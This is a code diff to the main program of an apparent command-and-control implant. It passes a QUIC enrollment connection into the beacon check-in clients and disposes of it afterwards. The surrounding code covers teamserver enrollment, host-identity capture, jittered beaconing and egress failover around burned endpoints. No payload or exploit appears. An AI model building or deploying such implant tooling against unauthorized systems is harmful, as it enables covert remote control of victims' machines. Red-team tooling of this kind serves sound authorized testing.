@@ -74,9 +74,10 @@ internal static class ImplantApp
         var egress = EgressEndpoints.Of(config);
 
         Enrollment enrollment;
+        IAsyncDisposable? enrollConnection;
         try
         {
-            enrollment = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, log, cts.Token);
+            (enrollment, enrollConnection) = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, log, cts.Token);
         }
         catch (Exception ex)
         {
@@ -123,7 +124,13 @@ internal static class ImplantApp
         // run time through the beacon.sleep verb (shared by every check-in
         // client covering this run).
         var cadence = new Cadence(config.Sleep, config.Jitter);
-        var setup = new CheckInSetup(config, enrollment, enroll, egress, nonces, held, log, cadence);
+        // The QUIC enroll exchange's live connection (architecture.md Sec 8,
+        // enrollment over QUIC), when the run opened one: it rides the setup
+        // so the QUIC client's first cycle speaks its handshake on the same
+        // stream the enroll rode. Every other shape (and a walk whose current
+        // beacon entry outgrew it) leaves it unconsumed; the disposal at the
+        // end is the no-op-or-harmless-close either way.
+        var setup = new CheckInSetup(config, enrollment, enroll, egress, nonces, held, log, cadence, enrollConnection);
         var clients = TransportSelection.CreateClients(setup);
         try
         {
@@ -154,6 +161,11 @@ internal static class ImplantApp
             Console.Error.WriteLine($"rod-implant: beacon: {ex.Message}");
             return 1;
         }
+        finally
+        {
+            if (enrollConnection is not null)
+                await enrollConnection.DisposeAsync();
+        }
 
         return 0;
     }
@@ -163,8 +175,11 @@ internal static class ImplantApp
     // spent, or expired token, malformed response) fails immediately -- retrying
     // would not change that answer. Each retry advances the egress walk
     // (architecture.md Sec 8), so a burned primary is left behind on the first
-    // failure rather than retried until the attempt budget is gone.
-    private static async Task<Enrollment> EnrollWithRetryAsync(
+    // failure rather than retried until the attempt budget is gone. Returns
+    // the enrollment plus the live QUIC connection the exchange rode when the
+    // answering entry was quic-schemed (null otherwise) -- the handoff the
+    // first session cycle completes.
+    private static async Task<(Enrollment Enrollment, IAsyncDisposable? Connection)> EnrollWithRetryAsync(
         EgressEndpoints egress,
         Config config,
         ECDsa privateKey,
@@ -177,17 +192,26 @@ internal static class ImplantApp
         {
             // The malleable transport profile (architecture.md Sec 7) shapes each
             // attempt: the current entry's host with the profiled enroll path.
+            // A quic-schemed entry rides as baked -- the frame exchange's dial.
             var enrollUrl = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport);
             // Report the machine once at the first successful attempt's enroll:
             // the teamserver records it as this implant's device identity.
             var host = HostIdentity.Capture();
+            var dial = new EnrollDial(
+                enrollUrl,
+                config.StagerToken,
+                ParentImplantId: null,
+                privateKey,
+                serverCAs,
+                config.Transport,
+                Host: host,
+                KillDate: config.HasKillDate ? config.KillDate.ToString("O") : null,
+                Log: log);
             try
             {
                 log.WriteLine($"rod-implant: enrolling at {enrollUrl}");
-                return await C2.EnrollAsync(
-                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, host: host,
-                    killDate: config.HasKillDate ? config.KillDate.ToString("O") : null,
-                    cancellationToken: cancellationToken);
+                var enrollment = await TransportSelection.EnrollAsync(dial, cancellationToken);
+                return (enrollment, dial.OpenedConnection);
             }
             catch (C2.EnrollRejectedException)
             {
